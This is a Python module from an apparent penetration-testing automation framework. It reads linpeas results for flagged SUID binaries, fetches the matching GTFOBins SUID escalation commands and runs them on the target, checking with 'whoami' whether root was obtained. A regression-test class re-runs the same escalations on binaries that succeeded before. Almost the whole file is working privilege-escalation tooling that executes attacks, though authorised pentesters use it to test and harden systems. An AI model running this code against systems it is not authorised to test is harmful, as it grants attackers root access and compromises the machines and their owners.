#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from core.regressiontest import RegressionTest
import json
import os
from core.helper import get_gtfobins, get_linpeas_result
from core.constants import EX, INTERNAL
from core.module import Module

# https://gtfobins.github.io/


class GtfobinsModule(Module):
    _type = [EX]
    _services = []
    _target_type = INTERNAL
    _defaults = {}
    _extension = ".json"

    def run(self):
        suid_list = []
        result = {}

        # Import the linpeas as jsonfile and get relevent data
        data = self.linpeas_res['Interesting Files']['sections']["SUID - Check easy privesc, exploits and write perms"]["lines"]

        # Get the vulnerable binary from data based on color and split to get relevent info
        for index in range(len(data)):
            for keys, values in data[index]['colors'].items():
                if ((keys == 'RED') or (keys == 'REDYELLOW') or (keys == 'YELLOW')):
                    x = values[0].split('  ', 1)
                    suid_list.append(x[0])

        # Go through SUID list
        for program in suid_list:
            # Get program name without extras
            program = program.split(" ")[0].split("/")[-1]

            if program in self.gtfobins:
                if program not in result:
                    result[program] = {}

                try:
                    # CHECK SUID
                    if "SUID" in self.gtfobins[program]:
                        code = self.gtfobins[program]["SUID"]["code"]
                        code = [x for x in code if x]  # Remove empty lines
                        code[-1] = f"echo 'whoami' | {code[-1]}"  # Get whoami after running last command, to see if root
                        sudo_install = False

                        # Check if install thingy
                        if code[0].startswith("sudo install -m =xs"):
                            sudo_install = True
                            self.run_cmd(code[0])
                            code = code[1:]

                        (_, r) = self.run_cmd(" && ".join(code), use_sudo=False)

                        # Create entry in result
                        if r.endswith("root"):
                            # SUCCESS
                            result[program]["suid"] = "success"
                        else:
                            # FAILED, buuhuu
                            result[program]["suid"] = "failed"

                        # Remove temporary file
                        if sudo_install:
                            self.run_cmd(f"rm ./{program}")
                except Exception:
                    result[program]["suid"] = "error"

        # Save result
        target_loc = f"{os.getcwd()}/targets/{self._target}/results"
        with open(f"{target_loc}/{self._res_name}.json", "w+") as f:
            f.write(json.dumps(result, indent=4))

    def parse(self):
        # Not needed
        pass

    def init(self):
        # Load result from linpeas
        self.linpeas_res = get_linpeas_result(self._target)

        # Load GTFOBINS
        self.gtfobins = get_gtfobins()


"""
Define regression tests here
"""


class GtfobinsSUIDRegression(RegressionTest):
    _extension = ".json" # Specifies what extension the result file has
    _description = "Checks if a program is still SUID hackable"
    _defaults = {
        
    }

    def run(self):
        gtfobins = get_gtfobins()
        result = {}

        # Go through SUID list
        for program in self._payload["programs"]:
            if program in gtfobins:
                # Add program to result 
                if program not in result:
                    result[program] = {}

                try:
                    # CHECK SUID
                    if "SUID" in gtfobins[program]:
                        code = gtfobins[program]["SUID"]["code"]
                        code = [x for x in code if x]  # Remove empty lines
                        code[-1] = f"echo 'whoami' | {code[-1]}"  # Get whoami after running last command, to see if root
                        sudo_install = False

                        # Check if install thingy
                        if code[0].startswith("sudo install -m =xs"):
                            sudo_install = True
                            self.run_cmd(code[0])
                            code = code[1:]

                        (_, r) = self.run_cmd(" && ".join(code), use_sudo=False)

                        # Create entry in result
                        if r.endswith("root"):
                            # SUCCESS
                            result[program]["suid"] = "success"
                        else:
                            # FAILED, buuhuu
                            result[program]["suid"] = "failed"

                        # Remove temporary file
                        if sudo_install:
                            self.run_cmd(f"rm ./{program}")
                except Exception:
                    result[program]["suid"] = "error"

        # Save result
        target_loc = f"{os.getcwd()}/targets/{self._target}/results/regtests"
        with open(f"{target_loc}/{self._res_name}.json", "w+") as f:
            f.write(json.dumps(result, indent=4))

    def parse(self):
        # Not needed
        pass

    def check(target):
        programs = []

        # Check gtofbins file for SUID hacked programs
        with open(
            f"{os.getcwd()}/targets/{target}/results/gtfobins_result.json",
            "r"
        ) as f:
            data = json.load(f)
        
        # Append succesfull SUID hacks
        for key, value in data.items():
            if value["suid"] == "success":
                programs.append(key)

        return {"programs": programs}
